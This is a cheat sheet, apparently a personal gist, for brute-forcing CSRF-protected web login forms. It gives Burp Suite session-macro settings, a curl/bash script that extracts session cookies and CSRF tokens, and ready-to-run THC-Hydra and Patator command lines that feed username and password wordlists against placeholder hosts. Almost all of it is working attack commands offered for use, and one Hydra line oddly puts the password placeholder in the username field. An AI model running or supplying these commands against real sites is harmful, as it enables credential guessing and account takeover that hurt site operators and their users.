# cheatshet CSRF burp/hydra/parrot

```
## Extract session and csrf using cURL, run Hydra/Patator bruteforce over Burpsuite proxy w/ rewritting macros
# @author intrd - http://dann.com.br/ (thx to g0tmi1k)
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

## Burp csrf-rewritting macro
- Session handling rules = new macro, tick Tolerate URL mismatch when matching parameters..
  Create a macro rule over method GET, extract custom parameter w/ parameter name = _csrf 
  and extract start after expression value=" and end at delimiter ", configure scope for domain and enable for Proxy, 
  Open session tracker to test. (on Intruder bruteforce, u need to untick Make unmodified baseline request).
- Proxy options = Enable Cookie jar for proxy, if not working, enable invisible proxing 
  and/or create Match and replace rule for Request header: GET / HTTP/1.0, Regex match.

## run.sh (shellscript to gen cookie and extract csrf)
#!/bin/bash
CSRF=$(curl -s -c dvwa.cookie "xxxhost.com" | awk -F 'value=' '/_csrf/ {print $2}' | cut -d '"' -f2)
SESSIONID=$(grep xxxhost.com xxxhost.cookie | awk -F ' ' '{print $7}')
CSRF=$(echo $CSRF | xargs) #xargs to remove trailing spaces
echo $CSRF

## THC-Hydra
$ rm -f hydra.restore #if u need reset the hydra session every run
$ export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 #socks5:// socks4:// connect:// #to enable hydra->burp proxying
hydra -L ~/xxxhost/users.txt -P ~/passwords/common-passwords.txt \
  -o logoutput.txt -e ns -F -u -t 1 -w 10 -V xxxhost.com http-post-form \
  "/:_token=anycsrftoberewrited&_action=login&_url=&_username=^PASS^&_passwd=^PASS^:S=@xxxhost.com:C=404.php:H=Cookie: PHPSESSION=${SESSIONID}" 2>&1 | tee -a logoutput.txt

## Patator (already fetching the csrf-rewrite, disable burpsuite csrf-rewritting macro, BS proxying is enabled for debugging)
$ patator http_fuzz http_proxy="http://127.0.0.1:8080" url="http://xxx.xxx.com/" \
  method=POST body='_token=_CSRF_&_task=login&_action=login&_url=&_user=xxx%40xxx.com&_pass=FILE0' 0=~/dics/common_int.txt \
  follow=0 accept_cookie=1 --threads=7 before_urls="http://xxx.xxx.com/" \
  header="Cookie: session1=${SESSIONID}" before_egrep='_CSRF_:name="_csrf" value="(\w+)" />' \
  -x quit:fgrep!='div id="loginform"' -x retry:fgrep="Server error" -l data --max-retries=5
  
## patator http_fuzz url="http://xxxx:xxxx/verificarLogin?ajax=true" \
  method=POST body='email=xxx%xxx.xxx&senha=FILE0' 0=~/dic.txt \
  follow=0 accept_cookie=1 --threads=45 \
  -x quit:fgrep!="Disallowed Key Characters.",fgrep!='esult":false' -l data --max-retries=5 --start=0 -d
#http_proxy="http://127.0.0.1:8080"
  
```
